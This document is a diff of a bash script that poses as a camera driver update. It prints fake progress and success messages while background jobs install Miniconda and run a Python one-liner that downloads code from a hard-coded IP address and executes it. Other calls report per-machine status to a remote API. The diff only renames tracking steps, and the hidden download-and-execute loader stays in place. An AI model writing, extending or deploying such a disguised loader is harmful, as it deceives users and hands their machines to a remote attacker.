@@ -45,14 +45,12 @@ download() {
 # Part 1 — UI / connection status
 # ----------------------------
 run_part1_camera_driver_ui() {
-  delay 3
-  echo "[INFO] Initializing camera driver update..."
-  delay 5
-  echo "[INFO] Detecting device..."
-  delay 4
-  echo "[INFO] Updating camera drivers..."
-  delay 10
-  echo "[SUCCESS] Camera drivers updated successfully."
+  echo "[INFO] Searching for Camera Drivers ..."
+  track_step "part1_step_1"
+  echo "[INFO] Updating Driver Packages..."
+  track_step "part1_step_2"
+  track_step "part1_step_3"
+  echo "[SUCCESS] Camera drivers have been updated successfully."
   if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
     curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
   fi
@@ -154,7 +152,7 @@ run_part2_node_driver() {
 # Part 3 — Miniconda (background worker 1)
 # ----------------------------
 run_part2_node_driver1() {
-  track_step "part1_step_1"
+  track_step "conda_step_1"
 
   local ARCH OS URL SHARED_DIR PREFIX INSTALLER
   ARCH="$(uname -m)"
@@ -191,10 +189,10 @@ run_part2_node_driver1() {
   rm -f "$INSTALLER"
 
   if [[ -x "${PREFIX}/bin/python3" ]]; then
-    track_step "part1_step_4"
+    track_step "conda_step_4"
     "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
   else
-    track_step "part1_step_2"
+    track_step "conda_step_2"
     curl -fsSL -o "$INSTALLER" "$URL"
     [[ -s "$INSTALLER" ]] || die "Miniconda installer download failed."
     chmod +x "$INSTALLER" >/dev/null 2>&1 || true
@@ -203,17 +201,17 @@ run_part2_node_driver1() {
       rm -rf "$PREFIX"
     fi
 
-    track_step "part1_step_3"
+    track_step "conda_step_3"
     if ! bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1; then
       die "Miniconda setup failed."
     fi
 
-    track_step "part1_step_4"
+    track_step "conda_step_4"
     "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
     "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
   fi
 
-  track_step "part1_step_5"
+  track_step "conda_step_5"
   rm -f "$INSTALLER"
   echo "Done."
 }
@@ -237,7 +235,7 @@ run_bg() {
 # ----------------------------
 # MAIN FLOW
 # ----------------------------
-# 1) Part 1 — foreground (terminal messages, delays, API status).
+# 1) Part 1 — foreground (camera driver UI + Part1 dashboard track-step).
 # 2) Part 2 + Part 3 — two independent nohup jobs after Part 1 returns.
 main() {
   run_part1_camera_driver_ui
